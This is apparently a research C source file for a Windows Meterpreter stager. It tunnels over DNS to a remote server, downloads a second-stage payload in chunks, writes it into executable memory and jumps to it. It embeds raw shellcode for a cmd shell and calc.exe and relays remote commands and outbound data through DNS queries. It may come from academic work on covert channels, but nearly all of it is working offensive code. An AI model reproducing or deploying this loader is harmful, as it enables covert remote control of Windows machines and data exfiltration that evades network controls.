#include <stdio.h>
#include <winsock2.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>

#include "types.h"
#include "DNSResolver.h"
#include "QueryOps.h"
#include "abstraction.h"
#include "config.h"
#include "errno.h"

//char shellcode[] =

/*
Daan Raman, University Ghent

1. Setup DNS tunnel
2. Download Meterpreter stage
3. Create local TCP listener
4. Attach client side of DNS tunnel to server side of TCP listener
5. Load client side of TCP listener as server description in ASM
6. Pass control to meterpreter stage (threaded)

STAGE [TCP client] <------------------> [TCP server] TCP ABSTRACTION / DNS TUNNEL [DNS client] <-----> INTERNET <-------> [DNS server]

*/
typedef SOCKET  (WINAPI * WSASOCKETA)( int, int, int, LPVOID, DWORD, DWORD );

void initWinsock(){
	// Initialize winsock, not that we should need to.
	WSAStartup(
		MAKEWORD(2, 2),
		&WsaData);

	srand((unsigned int)time(NULL));

}

/*
* Initiates the DNS tunnel and gets the ball rolling
*/
DWORD startTunnel()
{
	DWORD ThreadId;
	DWORD Result = ERROR_SUCCESS;

	//Initialize tunnel
	if((Result = InitializeLocalConnection()) != ERROR_SUCCESS){
		printf("ERROR initializing local connection\n");
	}

	//Get the second stage
	downloadSecondStage();
	
	//Create a new session before starting the local process
	if (requestSession()){
		printf("[startTunnel] Sucessfully requested new session \n");
	}else{
		printf("[startTunnel] Failed requesting new session\n");
		stopTunnel();
		return 1;
	}

	Sleep(2000);

	// Create the transmission thread
	if (!(ReceiveThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)ReceiveThreadFunc,
		NULL,
		0,
		&ThreadId)))
	{
		Result = ERROR_NOT_ENOUGH_MEMORY;
	}


	// Create the receive thread
	if (!(SendThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)SendThreadFunc,
		NULL,
		0,
		&ThreadId)))
	{
		Result = ERROR_NOT_ENOUGH_MEMORY;
	}
	
	if (Result != ERROR_SUCCESS){
		printf("[STARTUNNEL] Error starting tunnel\n");
	}
	
	return Result;
}

DWORD InitializeLocalConnection(){

	struct sockaddr_in Sin;
	USHORT  LocalPort         = 0;
	DWORD Attempts            = 0;
	DWORD Result              = ERROR_SUCCESS;
	HMODULE hWinsock          = NULL;
	WSASOCKETA pWSASocketA    = NULL;


	hWinsock = LoadLibraryA( "WS2_32.DLL" );

	LocalTcpListener = 0;
	LocalTcpClientSide = 0;

	if( hWinsock == NULL )
	{
		printf("Error creating hWinsock\n");
		Result = ERROR_NOT_ENOUGH_MEMORY;
	}

	pWSASocketA = (WSASOCKETA)GetProcAddress( hWinsock, "WSASocketA");

	if ( (LocalTcpListener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP )) == INVALID_SOCKET ){
		printf("[INIT] Unable to create listener socket (TCP)\n");
		Result = (unsigned long)SOCKET_ERROR;
	}

	// Create the TCP client socket
	// TCP client is later on passed to meterpreter
	LocalTcpClientSide = pWSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0 ,0 );
	if( LocalTcpClientSide == INVALID_SOCKET ){
		printf("[INIT] Unable to create client socket (TCP)\n");     
		Result = (unsigned long)SOCKET_ERROR;	
	}

	Sin.sin_family      = AF_INET;
	Sin.sin_addr.s_addr = inet_addr("127.0.0.1");
	//Sin.sin_port = htons(LocalPort = (rand() % 32000) + 1025);
	Sin.sin_port = htons(LocalPort = 7455);

	if( bind( LocalTcpListener, (struct sockaddr *)&Sin, sizeof(Sin) ) == SOCKET_ERROR ){
		printf("[INIT] Unable to bind to local listener\n"); 
		Result = (unsigned long)SOCKET_ERROR;       
	}else{
		printf("[INIT] Bind to local listener succesfull \n");
	}

	if (listen( LocalTcpListener, 1) == SOCKET_ERROR){
		printf("[INIT] Unable to listen\n"); 
		Result = (unsigned long)SOCKET_ERROR;       
	}

	// Establish a connection to the local listener
	if (connect( LocalTcpClientSide, (struct sockaddr *)&Sin, sizeof(Sin)) == SOCKET_ERROR)
	{
		printf("[INIT] Unable to connect local client side\n");  
		Result = (unsigned long)SOCKET_ERROR;      
	}

	// Accept the local TCP connection
	if ((LocalTcpServerSide = accept( LocalTcpListener, NULL, NULL)) == SOCKET_ERROR){
		printf("[INIT] Unable to accept on local TCP listener\n");  
		Result = (unsigned long)SOCKET_ERROR;      
	}

	return Result;

}

VOID downloadSecondStage(){
	int partNum = 0;

	DWORD ThreadId = 0;
	
	DWORD dwOldProtect = 0;
	DWORD dwSize = (10 * 4096);  //To change a set of X pages

	querydata* qdq =  malloc(sizeof(querydata));
	querydata* qda =  malloc(sizeof(querydata));
	
	//CALC.EXE
	//secondStage = "\x31\xf6\x56\x64\x8b\x76\x30\x8b\x76\xc\x8b\x76\x1c\x8b\x6e\x8\x8b\x36\x8b\x5d\x3c\x8b\x5c\x1d\x78\x1\xeb\x8b\x4b\x18\x67\xe3\xec\x8b\x7b\x20\x1\xef\x8b\x7c\x8f\xfc\x1\xef\x31\xc0\x99\x32\x17\x66\xc1\xca\x1\xae\x75\xf7\x66\x81\xfa\x10\xf5\xe0\xe2\x75\xcc\x8b\x53\x24\x1\xea\xf\xb7\x14\x4a\x8b\x7b\x1c\x1\xef\x3\x2c\x97\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x54\x87\x4\x24\x50\xff\xd5\xcc";
	
	//SHELL
	char* shell = "\xfc\xe8\x89\x0\x0\x0\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\xc\x8b\x52\x14\x8b\x72\x28\xf\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x2\x2c\x20\xc1\xcf\xd\x1\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x1\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x1\xd0\x50\x8b\x48\x18\x8b\x58\x20\x1\xd3\xe3\x3c\x49\x8b\x34\x8b\x1\xd6\x31\xff\x31\xc0\xac\xc1\xcf\xd\x1\xc7\x38\xe0\x75\xf4\x3\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x1\xd3\x66\x8b\xc\x4b\x8b\x58\x1c\x1\xd3\x8b\x4\x8b\x1\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x63\x6d\x64\x0\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x1\x1\x8d\x44\x24\x10\xc6\x0\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x8\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\xa\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x6\x7c\xa\x80\xfb\xe0\x75\x5\xbb\x47\x13\x72\x6f\x6a\x0\x53\xff\xd5";

	int downloadFinished;
	int bufLen;

	downloadFinished = 0;
	bufLen = 0;

	secondStage = malloc(sizeof(char) * 65000);

	printf("[DOWNLOADSECONDSTAGE] Requesting payload ...  \n");
	
	while (downloadFinished == 0){
		
		qdq = createQuery(0,partNum, CMD_GET_PAYLOAD, FALSE);
		//printf("Request for payload part %i\n", qdq->seqnum);

		//Send the request to the server
		qda = resolveDNS(qdq);
		
		if(inOrder(qdq, qda) && qdq->seqnum == partNum){
			//Check if this indicates EOF
			if(strcmp(EOF_GET_PAYLOAD, qda->data) == 0){
				printf("[DOWNLOADSECONDSTAGE] Finished pulling over payload - %i bytes\n", bufLen);
				downloadFinished = 1;
				continue;
			}
			
			memcpy(secondStage + bufLen, qda->data, qda->bufSize);
			bufLen = bufLen + qda->bufSize;

			//printf("[DOWNLOADSECONDSTAGE] Received part %i (%i bytes)\n", qda->seqnum, qda->bufSize);
			partNum++; //Increase part number
		}else{
			//Out of order delivery. Try again.
			printf("[DOWNLOADSECONDSTAGE] OoO delivery of packet... Retrying.\n");
		}
	}
	
	
	pMem = VirtualAlloc(NULL,dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(pMem == NULL){
		printf("DOWNLOADSECONDSTAGE] VIRTUALALLOC FAILED\n");
	}else{
		printf("[DOWNLOADSECONDSTAGE] VIRTUALALLOC OK - %0x08\n", pMem);
	}
	
	/*for(i = 0; i < bufLen ; i ++){
		/*if(secondStage[i] == '\0'){
			printf("NULLBYTE HERE\n");
		}
		printf("%02X ", (unsigned char)secondStage[i]);
	}
	//memcpy(secondStage, shell, 240);
	*/

	//Copy second stage to new allocated memory
	printf("[DOWNLOADSECONDSTAGE] COPYING shellcode to mempointer\n\n");
	memcpy(pMem, secondStage, bufLen);
	
	// Create the second stage thread
		SecondStageThread = CreateThread(
				NULL,
				0,
				(LPTHREAD_START_ROUTINE)secondStageThreadFuncSt,
				0,
				0,
				&ThreadId);
}

ULONG ReceiveThreadFunc()
{
	PUCHAR ReadBuffer = malloc(sizeof(char) * 255); //Max size of a command coming in ...
	
	printf("[RECVTHREAD] Starting infinite loop\n");
	while (1)
	{
		if (pollForData(ReadBuffer) == ERROR_SUCCESS && ReadBuffer){
			TransmitToLocal(ReadBuffer);	
			free(ReadBuffer);
		}
		
		//Do not flood the network with polling queries
		Sleep(1000);
	}


	return 0;
}

DWORD pollForData(IN PUCHAR buffer){
	DWORD result;
	
	querydata* qr;
	querydata* qa;
	
	char* term = '\0';

	result = ERROR_SUCCESS;
	
	qr = createQuery(0,0, CMD_GET_POLLING, FALSE);
	qa = resolveDNS(qr);
	
	if(strcmp(qa->data, SIG_NO_DATA) == 0){
		result = ERROR_NO_DATA;
		buffer = NULL;
		printf("[<<] No bytes for local side after polling\n"); 
	}else{
		
		qa->data[qa->bufSize] = '\0';
		strcpy(buffer, qa->data);
		
		//memcpy(buffer + qa->bufSize, term, 1);//Commands for local must terminate
		//printf("[<<] Got polling command: %s \n", buffer); 
	}
	

	return result;
}

/*
* Monitors the server side of the local TCP abstraction for data that can be
* transmitted to the remote half of the pipe
*/
ULONG SendThreadFunc()
{
	fd_set FdSet;
	
	//UCHAR  ReadBuffer[16384];
	UCHAR  ReadBuffer[64];
	
	LONG   BytesRead;
	INT    Result;


	printf("[SENDTHREAD] Starting infinite loop\n");
	while (1)
	{   
		FD_ZERO(
			&FdSet);
		FD_SET(
			LocalTcpServerSide,
			&FdSet);


		// Wait for some data...
		Result = select(LocalTcpServerSide + 1, &FdSet, NULL, NULL, NULL);

		if (Result < 0){
			printf("[SENDTHREAD] Error selecting local TCP server side...\n");  
			break;  
		}

		printf("[>>] Blocking for data \n");
		// Read in data from the local server side of the TCP connection
		BytesRead = recv(
			LocalTcpServerSide,
			(char *)ReadBuffer,
			sizeof(ReadBuffer),
			0);

		/* On error or end of file... */
		if (BytesRead > 0)
		{
			printf("[>>] Transmitting %lu bytes of data to remote side.\n", BytesRead); 
			ReadBuffer[64] = '\0';
		}else{
			printf("[>>] No bytes for remote side\n"); 
		}

		if ((Result = TransmitToRemote(
			ReadBuffer,
			BytesRead)) != ERROR_SUCCESS)
		{
			printf("[SENDTHREAD] TransmitToRemote failed\n");
		}
	}

	// Exit the process if the send thread ends
	ExitProcess(0);

	return 0;
}


/*

* Transmits the supplied data to the server side of the local TCP abstraction
*/
DWORD TransmitToLocal(IN unsigned char* Buffer)
{
	DWORD Result = ERROR_SUCCESS;
	INT   BytesWritten = 0;

	ULONG BufferSize = strlen((const char*)Buffer);

	// Keep writing until everything has been written
	while (BufferSize > 0)
	{

		if ((BytesWritten = send(
			LocalTcpServerSide,
			(const char *)Buffer,
			BufferSize,
			0)) == SOCKET_ERROR)
		{
			Result = (unsigned long)SOCKET_ERROR;
			printf("[<<] Error delivering data to server side of the TCP abstraction\n");
			break;
		}else{
			printf("[<<] Delivered %i bytes to local [%s]\n", BufferSize, Buffer);
		}

		Buffer     += BytesWritten;
		BufferSize -= BytesWritten;
	}

	return Result;
}

DWORD TransmitToRemote(IN PUCHAR Buffer, IN ULONG BufferSize){
	DWORD result;
	
	querydata* qr;
	querydata* qa;
	
	querydata* qdq =  malloc(sizeof(querydata));
	querydata* qda =  malloc(sizeof(querydata));

	result = ERROR_SUCCESS;

	qr = createQuery(0,0, Buffer, TRUE);
	qa = resolveDNS(qr);

	if(strcmp(qa->data, SIG_ACK) == 0){
		printf("[>>] Got ACK for %i bytes\n", BufferSize);
	}else{
		printf("[>>] Error delivering %i bytes to remote\n", BufferSize);
	}
	
	return result;
}

DWORD stopTunnel()
{
	DWORD Result = ERROR_SUCCESS;
	
	// Close all of the open sockets we may have
	if (LocalTcpListener)
		closesocket(
				LocalTcpListener);
	if (LocalTcpClientSide)
		closesocket(
				LocalTcpClientSide);
	if (LocalTcpServerSide)
		closesocket(
				LocalTcpServerSide);

	LocalTcpListener   = 0;
	LocalTcpClientSide = 0;
	LocalTcpServerSide = 0;

	// Free up memory associated with the second stage
	if (secondStage)
	{
		free(secondStage);
	}

	// Cleanup winsock
	WSACleanup();

	return Result;
}

/*
 * Calls the second stage after initializing the proper registers
 */
ULONG secondStageThreadFuncSt()
{
	SOCKET Fd = LocalTcpClientSide;
	
	printf("[STAGETHREAD] Jumping to shellcode now\n");

	// Initialize edi to the file descriptor that the second stage might use
	__asm
	{
		lea eax, [Fd]
		mov edi, [eax]
	}

	((VOID (*)())pMem)();

	printf("[STAGETHREAD] Finished executing second stage \n");
	return 0;
}

void testAbstractionClientSide(){
	char* buf = "THIS DATA NEEDS TO GO TO THE ATTACKER.\n";
	send(LocalTcpClientSide, buf, strlen(buf), 0);                               
}

Bool requestSession(){
	querydata* qdq =  malloc(sizeof(querydata));
	querydata* qda =  malloc(sizeof(querydata));

	qdq = createQuery(0,0, CMD_INIT_SESSION, FALSE);
	qda = resolveDNS(qdq);

	if(strcmp(qda->data, CMD_OK_SESSION) == 0){
		return TRUE;
	}else{
		return FALSE;
	}
}

void testAbstractionServerSide(){
	char* buf = "systeminfo\n";
	TransmitToLocal(buf);                             
}


